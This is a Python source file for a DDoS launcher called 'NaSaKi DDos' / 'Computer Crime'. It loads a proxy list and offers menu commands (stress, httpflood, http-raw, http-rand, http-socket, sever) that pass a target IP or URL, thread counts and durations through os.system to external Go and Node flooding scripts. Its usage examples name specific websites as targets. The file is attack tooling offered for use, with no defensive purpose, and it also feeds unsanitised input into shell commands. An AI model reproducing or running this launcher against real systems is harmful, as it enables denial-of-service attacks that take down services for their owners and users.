from multiprocessing.connection import wait
import socket
import os
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def si():
    print('\x1b[38;2;233;233;233mWelcome to NaSaKi DDos \x1b[38;2;233;233;233mBy TrungHai')
    print("")

def special():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mSpecial    \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mstress              \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
''')

def menu():
    sys.stdout.write(f"\x1b]2;Computer Crime by CRIME COMPUTER M8Y")
    clear()
    print('\x1b[38;2;233;233;233mWelcome to Computer Crime \x1b[38;2;233;233;233mBy TrungHai')
    clear()
    print('\x1b[38;2;233;233;233mWelcome to Computer Crime \x1b[38;2;233;233;233mBy CRIME COMPUTER M8Y')
    print(f'''\x1b[38;2;255;140;0m▄████▄   ▒█████   ███▄ ▄███▓ ██▓███   █    ██ ▄▄▄█████▓▓█████  ██▀███      ▄████▄   ██▀███   ██▓ ███▄ ▄███▓▓█████ 
\x1b[38;2;255;140;0m▒██▀ ▀█  ▒██▒  ██▒▓██▒▀█▀ ██▒▓██░  ██▒ ██  ▓██▒▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒   ▒██▀ ▀█  ▓██ ▒ ██▒▓██▒▓██▒▀█▀ ██▒▓█   ▀ 
\x1b[38;2;255;140;0m▒▓█    ▄ ▒██░  ██▒▓██    ▓██░▓██░ ██▓▒▓██  ▒██░▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒   ▒▓█    ▄ ▓██ ░▄█ ▒▒██▒▓██    ▓██░▒███   
\x1b[38;2;255;140;0m▒▓▓▄ ▄██▒▒██   ██░▒██    ▒██ ▒██▄█▓▒ ▒▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄     ▒▓▓▄ ▄██▒▒██▀▀█▄  ░██░▒██    ▒██ ▒▓█  ▄ 
\x1b[38;2;255;140;0m▒ ▓███▀ ░░ ████▓▒░▒██▒   ░██▒▒██▒ ░  ░▒▒█████▓   ▒██▒ ░ ░▒████▒░██▓ ▒██▒   ▒ ▓███▀ ░░██▓ ▒██▒░██░▒██▒   ░██▒░▒████▒
\x1b[38;2;255;140;0m░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ░  ░▒▓▒░ ░  ░░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░   ░ ░▒ ▒  ░░ ▒▓ ░▒▓░░▓  ░ ▒░   ░  ░░░ ▒░ ░
 \x1b[38;2;255;140;0m ░  ▒     ░ ▒ ▒░ ░  ░      ░░▒ ░     ░░▒░ ░ ░     ░     ░ ░  ░  ░▒ ░ ▒░     ░  ▒     ░▒ ░ ▒░ ▒ ░░  ░      ░ ░ ░  ░
\x1b[38;2;255;140;0m░        ░ ░ ░ ▒  ░      ░   ░░        ░░░ ░ ░   ░         ░     ░░   ░    ░          ░░   ░  ▒ ░░      ░      ░   
\x1b[38;2;255;140;0m░ ░          ░ ░         ░               ░                 ░  ░   ░        ░ ░         ░      ░         ░      ░  ░
\x1b[38;2;255;140;0m░                                                                          ░                                       
            \x1b[38;2;255;140;0m ╔═══════════════\x1b[38;2;255;165;0m╦═══════════════════╦\x1b[38;2;0;212;14m═══════════════╗
                             \x1b[38;2;255;140;0m║  \x1b[38;2;255;140;0mZaLo: 0564833795 \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m╔═════════════╩═══════════════════╩═════════════╗
               \x1b[38;2;255;140;0m╔═╗┌─┐┌┬┐┌─┐┬ ┬┌┬┐┌─┐┬─┐  ╔═╗┬─┐┬┌┬┐┌─┐
               \x1b[38;2;255;140;0m║  │ ││││├─┘│ │ │ ├┤ ├┬┘  ║  ├┬┘││││├┤ 
               \x1b[38;2;255;140;0m╚═╝└─┘┴ ┴┴  └─┘ ┴ └─┘┴└─  ╚═╝┴└─┴┴ ┴└─┘                \x1b[38;2;255;140;0m      
               \x1b[38;2;255;140;0m║               \x1b[38;2;255;140;0m               \x1b[38;2;255;140;0m║ 
               \x1b[38;2;255;140;0m║               \x1b[38;2;255;140;0m                \x1b[38;2;0;212;14m║                                                  
               \x1b[38;2;255;140;0m║   \x1b[38;2;255;140;0msever              \x1b[38;2;255;140;0m║   \x1b[38;2;255;140;0mstress               \x1b[38;2;255;140;0m║ 
               \x1b[38;2;255;140;0m║   \x1b[38;2;255;140;0mhttp-socket        \x1b[38;2;255;140;0m║   \x1b[38;2;255;140;0mhttpflood            \x1b[38;2;255;140;0m║ 
               \x1b[38;2;255;140;0m║   \x1b[38;2;255;140;0mhttp-raw           \x1b[38;2;255;140;0m║   \x1b[38;2;255;140;0mhttp-rand            \x1b[38;2;0;212;14m║
               \x1b[38;2;255;140;0m╚═══════════════════════════════════════════════╝
''')

def main():
    menu()
    while(True):
        cnc = input('''\x1b[38;2;0;212;14mInput:''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()

# SPECIAL METHODS

        elif "stress" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print('Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print('MODE: [1] TCP')
                print('      [2] UDP')
                print('      [3] HTTP')
                print('Example: stress 1.1.1.1 80/443 3 1250 60 5')
                
# LAYER 7 METHODS
        
        elif "http-socket" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node HTTP-SOCKETS.js {url} {per} {time}')
            except IndexError:
                print('Usage: http-socket <url> <per> <time>')
                print('Example: http-socket http://example.com 5000 60')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAW.js {url} {time}')
            except IndexError:
                print('Usage: http-raw <url> <time>')
                print('Example: http-raw http://example.com 60')

        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print('Usage: http-rand <url> <time>')
                print('Example: http-rand http://vailon.com/ 60')

        elif "httpflood" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
                print('Example: httpflood http://example.com 15000 get 60')

        elif "sever" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run sever.go -site {url} {method} nil')
            except IndexError:
                print('Usage: sever <url> METHODS<GET/POST>')
                print('Example: sever http://vailon.com/ GET')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass
            
def login():
    main()

login()
